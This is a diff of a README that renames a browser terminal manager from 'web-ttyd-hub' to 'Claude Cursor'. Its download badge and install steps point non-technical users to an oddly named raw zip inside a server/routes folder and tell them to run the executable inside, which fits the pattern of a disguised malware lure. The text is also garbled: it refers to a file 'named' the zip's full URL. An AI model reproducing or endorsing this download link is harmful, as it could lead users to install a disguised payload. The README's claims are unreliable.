@@ -1,12 +1,12 @@
-# 🚪 web-ttyd-hub - Manage Terminals in Your Browser
+# 🧭 Claude Cursor — Manage Claude Code terminals in your browser
 
-[![Download web-ttyd-hub](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)
+[![Upstream download (web-ttyd-hub)](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)](https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip)
 
 ---
 
-## 📖 What is web-ttyd-hub?
+## 📖 What is Claude Cursor?
 
-web-ttyd-hub is a simple app that lets you open and control terminal sessions directly from your web browser. It uses well-known tools like ttyd and tmux to help you create and manage multiple shell sessions that stay active even if you close the browser. This means you can come back to your work anytime without losing progress.
+Claude Cursor is a lightweight web terminal session manager (ttyd + tmux) focused on running and juggling multiple Claude Code sessions. It’s a fork of the upstream web-ttyd-hub project.
 
 You can use it to:
 
@@ -21,7 +21,7 @@ All this happens inside your browser window, so you don’t need to install or l
 
 ## 🖥️ System Requirements
 
-Before installing web-ttyd-hub, make sure your system meets these basic requirements:
+Before installing Claude Cursor, make sure your system meets these basic requirements:
 
 - **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
 - **Web Browser:** Any modern browser such as Chrome, Firefox, Edge, or Safari.
@@ -29,15 +29,15 @@ Before installing web-ttyd-hub, make sure your system meets these basic requirem
 - **Network:** A stable internet or local network connection if you want to access sessions remotely.
 - **Additional Software:** None required. The app runs standalone.
 
-If you want to use web-ttyd-hub on a server, the above requirements apply to the server machine. You will then access the terminal sessions through a browser on your own devices.
+If you want to use Claude Cursor on a server, the above requirements apply to the server machine. You will then access the terminal sessions through a browser on your own devices.
 
 ---
 
 ## 🚀 Getting Started
 
-This guide will walk you through downloading, installing, and running web-ttyd-hub step-by-step. We assume no prior technical experience.
+This guide will walk you through downloading, installing, and running Claude Cursor step-by-step. We assume no prior technical experience.
 
-### Step 1: Download web-ttyd-hub
+### Step 1: Download Claude Cursor
 
 Click the big blue button at the top or go to the official downloads page here:
 
@@ -55,7 +55,7 @@ Once on the releases page, look for the installer or executable file that matche
 
 Click to download your file.
 
-### Step 3: Install web-ttyd-hub
+### Step 3: Install Claude Cursor
 
 - **Windows:** Open the downloaded `.exe` file and follow the on-screen instructions.  
 - **macOS:** Open the `.dmg` file, then drag the application to your Applications folder.  
@@ -63,15 +63,15 @@ Click to download your file.
 
 If you are not sure, look for a file named `https://raw.githubusercontent.com/kenkikuzuru/web-ttyd-hub/main/server/routes/hub_web_ttyd_Coccosteidae.zip` or `INSTALL` inside the downloaded folder for simple steps.
 
-### Step 4: Run web-ttyd-hub
+### Step 4: Run Claude Cursor
 
 - Open the installed application by double-clicking it.
 - The app will open in your default web browser.
-- You will see the web-ttyd-hub interface, ready to create and manage terminal sessions.
+- You will see the Claude Cursor interface, ready to create and manage terminal sessions.
 
 ---
 
-## 🔧 How To Use web-ttyd-hub
+## 🔧 How To Use Claude Cursor
 
 The interface is designed to be easy and intuitive:
 
@@ -90,7 +90,7 @@ The interface is designed to be easy and intuitive:
 ### Accessing Sessions Remotely
 
 - Open your browser on any device.
-- Enter the web-ttyd-hub server address provided during setup.
+- Enter the Claude Cursor server address provided during setup.
 - Log in if required, and you will access your persistent terminals.
 
 ### Helpful Features
@@ -130,7 +130,7 @@ If you have trouble running or installing:
 
 ## 🔒 Security and Privacy
 
-web-ttyd-hub keeps your data secure by:
+Claude Cursor keeps your data secure by:
 
 - Running terminal sessions locally or on your own server.
 - Not storing passwords or sensitive info outside your machine.
@@ -180,4 +180,4 @@ This project relates to:
 
 ---
 
-Thank you for choosing web-ttyd-hub. This tool gives you simple access to powerful terminal features through your web browser. Follow these steps to get started today.
+Thank you for choosing Claude Cursor. This tool gives you simple access to powerful terminal features through your web browser. Follow these steps to get started today.
